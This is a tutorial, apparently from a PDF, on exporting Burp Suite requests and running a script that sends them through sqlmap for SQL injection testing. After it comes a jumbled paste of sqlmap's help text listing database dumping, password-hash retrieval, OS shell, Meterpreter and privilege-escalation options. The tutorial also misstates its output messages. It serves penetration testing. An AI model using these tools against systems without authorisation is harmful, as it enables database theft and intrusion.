Burp or Burp Suite is a graphical tool for testing Web application security. The tool is written in Javaand developed by PortSwigger Security. It was developed to provide a comprehensive solution forweb application security checks. In addition to basic functionality, such as proxy server, scanner andintruder, the tool also contains more advanced options such as a spider, a repeater, a decoder, acomparer, an extender and a sequencer.
Exporting Packets from Burp Suite
First of all you should open your Burp Suite application and browse your target URLs. Rememberthat you should set your browser proxy on Burp Suite. Burp will Crawl Your Target Automaticly andsave all of packets in HTTP history Tab.Click on
Proxy > HTTP history
 to see your Burp Suite Packet history.Note: if you browse other websites during the test process, you should click on HOST header culomnto set order on that. So you will have all of your target packets in one place.Based on out explanation in INTRODUCTION, Burp-TO-SQLMap script performs SQL Injection testusing SQLMAP and SQLMap needs URLs with valid Parameters (POST/GET). So you should only selectparametrized requests. Fortunately, this is easy and you can filter parametrized packets with justtwo clicks.Click On
Filter
 Section and select
Show only parametrized requests
.

 
5 |Page As you see Now we only have parametrized requests.Select all of your target packets for performing SQL Injection Test. Right Click and Click on
Saveitems
.

 
6 |Page In the new windows, uncheck
Base64-encode requests and responses
. Choose a name for your burpstate file and save it. Now its done and you only need to run script, give this file as input and get thevulnerability result in output.
Installing Burp-to-SQLMap Script
You can use Burp-to-SQLMap script on windows platform. But we have some plan for extend it towork on Linux and mac.1)
 
Download and Install python 2.7 (you can download it from bellow URL)

 
https://www.python.org/download/releases/2.7/2)
 
Download and install java SE from bellow URL.

 
http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html3)
 
Download and install latest version of Burp Suite from bellow URL.

 
https://portswigger.net/burp/communitydownload4)
 
Download and Install sql map. (you can download it from sqlmap website)
 

 
http://sqlmap.org/5)
 
Download Burp-To-SQLMap script from Github.

 
https://github.com/Miladkhoshdel/burp-to-sqlmap

 
7 |Page 
Running Burp-To-SQLMap Script
Run Script with bellow command.C:\> python burp-to-sqlmap.py -f burp -o result -s D:\Apps\SQLMAPNote:

 
-f Input File (Burp State File)

 
-o Output Directory

 
-s SQLMap PathScript will extract all of GET/POST request and save each request in separate file in output directory.After that script will run sqlmap and test request files one by one and print the result. For vulnerablerequests it print
URL is not Vulnerable
and for other URLs it print
URL is not Vulnerable.
Also it will print the complete sqlmap output for each request in a separate file beside the requestfile in output directory.

 
8 |Page Also if you open your Output direcoty, you can see list of requests ans result file. You can use it foryour exploit evidence or POC.
Refrences
1.
 
https://www.owasp.org/index.php/SQL_Injection2.
 
https://en.wikipedia.org/wiki/SQL_injection3.
 
https://en.wikipedia.org/wiki/Burp_suite4.
 
https://en.wikipedia.org/wiki/Sqlmap

p TESTPARAMETER Testable parameter(s) --skip=SKIP Skip testing for given parameter(s) --skip-static Skip testing parameters that not appear to be dynamic --param-exclude=.. Regexp to exclude parameters from testing (e.g. "ses") --param-filter=P.. Select testable parameter(s) by place (e.g. "POST") --dbms=DBMS Force back-end DBMS to provided value --dbms-cred=DBMS.. DBMS authentication credentials (user:password) --os=OS Force back-end DBMS operating system to provided value --invalid-bignum Use big numbers for invalidating values --invalid-logical Use logical operations for invalidating values --invalid-string Use random strings for invalidating values --no-cast Turn off payload casting mechanism --no-escape Turn off string escaping mechanism --prefix=PREFIX Injection payload prefix string --suffix=SUFFIX Injection payload suffix string --tamper=TAMPER Use given script(s) for tampering injection data Detection --level=LEVEL Level of tests to perform (1-5, default 1) --risk=RISK Risk of tests to perform (1-3, default 1) --string=STRING String to match when query is evaluated to True --not-string=NOT.. String to match when query is evaluated to False --regexp=REGEXP Regexp to match when query is evaluated to True --code=CODE HTTP code to match when query is evaluated to True --smart Perform thorough tests only if positive heuristic(s) --text-only Compare pages based only on the textual content --titles Compare pages based only on their titles Techniques --technique=TECH.. SQL injection techniques to use (default "BEUSTQ") --time-sec=TIMESEC Seconds to delay the DBMS response (default 5) --union-cols=UCOLS Range of columns to test for UNION query SQL injection --union-char=UCHAR Character to use for bruteforcing number of columns --union-from=UFROMTable to use in FROM part of UNION query SQL injection --dns-domain=DNS.. Domain name used for DNS exfiltration attack --second-url=SEC.. Resulting page URL searched for second-order response --second-req=SEC.. Load second-order HTTP request from file Fingerprint -f, --fingerprint Perform an extensive DBMS version fingerprintEnumeration -a, --allRetrieve everything -b, --bannerRetrieve DBMS banner --current-userRetrieve DBMS current user --current-dbRetrieve DBMS current database --hostnameRetrieve DBMS server hostname --is-dbaDetect if the DBMS current user is DBA --usersEnumerate DBMS users --passwordsEnumerate DBMS users password hashes --privilegesEnumerate DBMS users privileges --rolesEnumerate DBMS users roles --dbsEnumerate DBMS databases --tablesEnumerate DBMS database tables --columnsEnumerate DBMS database table columns --schemaEnumerate DBMS schema --countRetrieve number of entries for table(s) --dumpDump DBMS database table entries --dump-allDump all DBMS databases tables entries --searchSearch column(s), table(s) and/or database name(s) --commentsCheck for DBMS comments during enumeration --statementsRetrieve SQL statements being run on DBMS -D DBDBMS database to enumerate -T TBLDBMS database table(s) to enumerate -C COLDBMS database table column(s) to enumerate -X EXCLUDEDBMS database identifier(s) to not enumerate -U USERDBMS user to enumerate --exclude-sysdbsExclude DBMS system databases when enumerating tables --pivot-column=P..Pivot column name --where=DUMPWHUse WHERE condition while table dumping --start=LIMITSTARTFirst dump table entry to retrieve --stop=LIMITSTOPLast dump table entry to retrieve --first=FIRSTCHARFirst query output word character to retrieve --last=LASTCHARLast query output word character to retrieve --sql-query=SQLQ..SQL statement to be executed --sql-shellPrompt for an interactive SQL shell --sql-file=SQLFILEExecute SQL statements from given file(s)Brute force --common-tablesCheck existence of common tables --common-columnsCheck existence of common columns --common-filesCheck existence of common files User-defined function injection --udf-injectInject custom user-defined functions --shared-lib=SHLIBLocal path of the shared library File system access --file-read=FILE..Read a file from the back-end DBMS file system --file-write=FIL..Write a local file on the back-end DBMS file system --file-dest=FILE..Back-end DBMS absolute filepath to write toOperating system access --os-cmd=OSCMDExecute an operating system command --os-shellPrompt for an interactive operating system shell --os-pwnPrompt for an OOB shell, Meterpreter or VNC --os-smbrelayOne click prompt for an OOB shell, Meterpreter or VNC --os-bofStored procedure buffer overflow exploitation --priv-escDatabase process user privilege escalation --msf-path=MSFPATHLocal path where Metasploit Framework is installed --tmp-path=TMPPATHRemote absolute path of temporary files directoryWindows registry access --reg-readRead a Windows registry key value --reg-addWrite a Windows registry key value data --reg-delDelete a Windows registry key value --reg-key=REGKEYWindows registry key --reg-value=REGVALWindows registry key value --reg-data=REGDATAWindows registry key value data --reg-type=REGTYPEWindows registry key value typeGeneral -s SESSIONFILELoad session from a stored (.sqlite) file -t TRAFFICFILELog all HTTP traffic into a textual file --answers=ANSWERSSet predefined answers (e.g. "quit=N,follow=N") --base64=BASE64P..Parameter(s) containing Base64 encoded data --base64-safeUse URL and filename safe Base64 alphabet (RFC 4648) --batchNever ask for user input, use the default behavior --binary-fields=..Result fields having binary values (e.g. "digest") --check-internetCheck Internet connection before assessing the target --cleanupClean up the DBMS from sqlmap specific UDF and tables --crawl=CRAWLDEPTHCrawl the website starting from the target URL --crawl-exclude=..Regexp to exclude pages from crawling (e.g. "logout") --csv-del=CSVDELDelimiting character used in CSV output (default ",") --charset=CHARSETBlind SQL injection charset (e.g. "0123456789abcdef") --dump-file=DUMP..Store dumped data to a custom file --dump-format=DU..Format of dumped data (CSV (default), HTML or SQLITE) --encoding=ENCOD..Character encoding used for data retrieval (e.g. GBK) --etaDisplay for each output the estimated time of arrival --flush-sessionFlush session files for current target --formsParse and test forms on target URL --fresh-queriesIgnore query results stored in session file --gpage=GOOGLEPAGEUse Google dork results from specified page number --har=HARFILELog all HTTP traffic into a HAR file --hexUse hex conversion during data retrieval --output-dir=OUT..Custom output directory path --parse-errorsParse and display DBMS error messages from responses --preprocess=PRE..Use given script(s) for preprocessing (request) --postprocess=PO..Use given script(s) for postprocessing (response) --repairRedump entries having unknown character marker (?) --save=SAVECONFIGSave options to a configuration INI file --scope=SCOPERegexp for filtering targets --skip-heuristicsSkip heuristic detection of vulnerabilities --skip-wafSkip heuristic detection of WAF/IPS protection --table-prefix=T..Prefix used for temporary tables (default: "sqlmap") --test-filter=TE..Select tests by payloads and/or titles (e.g. ROW) --test-skip=TEST..Skip tests by payloads and/or titles (e.g. BENCHMARK) --web-root=WEBROOTWeb server document root directory (e.g. "/var/www")Miscellaneous -z MNEMONICS

-h, --help Show basic help message and exit -hh Show advanced help message and exit --version Show program's version number and exit -v VERBOSE Verbosity level: 0-6 (default 1)Target -u URL, --url=URL Target URL (e.g. "http://www.site.com/vuln.php?id=1") -d DIRECT Connection string for direct database connection -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file -m BULKFILE Scan multiple targets given in a textual file -r REQUESTFILE Load HTTP request from a file -g GOOGLEDORK Process Google dork results as target URLs -c CONFIGFILE Load options from a configuration INI fileRequest -A AGENT, --user.. HTTP User-Agent header value -H HEADER, --hea.. Extra header (e.g. "X-Forwarded-For: 127.0.0.1") --method=METHOD Force usage of given HTTP method (e.g. PUT) --data=DATA Data string to be sent through POST (e.g. "id=1") --param-del=PARA.. Character used for splitting parameter values (e.g. &) --cookie=COOKIE HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..") --cookie-del=COO.. Character used for splitting cookie values (e.g. ;) --live-cookies=L.. Live cookies file used for loading up-to-date values --load-cookies=L.. File containing cookies in Netscape/wget format --drop-set-cookie Ignore Set-Cookie header from response --mobile Imitate smartphone through HTTP User-Agent header --random-agent Use randomly selected HTTP User-Agent header value --host=HOST HTTP Host header value --referer=REFERER HTTP Referer header value --headers=HEADERS Extra headers (e.g. "Accept-Language: fr\nETag: 123") --auth-type=AUTH.. HTTP authentication type (Basic, Digest, Bearer, ...) --auth-cred=AUTH.. HTTP authentication credentials (name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file --ignore-code=IG.. Ignore (problematic) HTTP error code (e.g. 401) --ignore-proxy Ignore system default proxy settings --ignore-redirects Ignore redirection attempts --ignore-timeouts Ignore connection timeouts --proxy=PROXY Use a proxy to connect to the target URL --proxy-cred=PRO.. Proxy authentication credentials (name:password) --proxy-file=PRO.. Load proxy list from a file --proxy-freq=PRO.. Requests between change of proxy from a given list --tor Use Tor anonymity network --tor-port=TORPORT Set Tor proxy port other than default --tor-type=TORTYPE Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default)) --check-tor Check to see if Tor is used properly --delay=DELAY Delay in seconds between each HTTP request --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) --retries=RETRIES Retries when the connection timeouts (default 3) --retry-on=RETRYON Retry request on regexp matching content (e.g. "drop") --randomize=RPARARandomly change value for given parameter(s) --safe-url=SAFEURL URL address to visit frequently during testing --safe-post=SAFE.. POST data to send to a safe URL --safe-req=SAFER.. Load safe HTTP request from a file --safe-freq=SAFE.. Regular requests between visits to a safe URL --skip-urlencode Skip URL encoding of payload data --csrf-token=CSR.. Parameter used to hold anti-CSRF token --csrf-url=CSRFURL URL address to visit for extraction of anti-CSRF token --csrf-method=CS.. HTTP method to use during anti-CSRF token page visit --csrf-data=CSRF.. POST data to send during anti-CSRF token page visit --csrf-retries=C.. Retries for anti-CSRF token retrieval (default 0) --force-ssl Force usage of SSL/HTTPS --chunked Use HTTP chunked transfer encoded (POST) requests --hpp Use HTTP parameter pollution method --eval=EVALCODEEvaluate provided Python code before the request (e.g."importhashlib;id2=hashlib.md5(id).hexdigest()") Optimization -o Turn on all optimization switches --predict-output Predict common queries output --keep-alive Use persistent HTTP(s) connections --null-connection Retrieve page length without actual HTTP response body --threads=THREADSMax number of concurrent HTTP(s) requests (default 1)












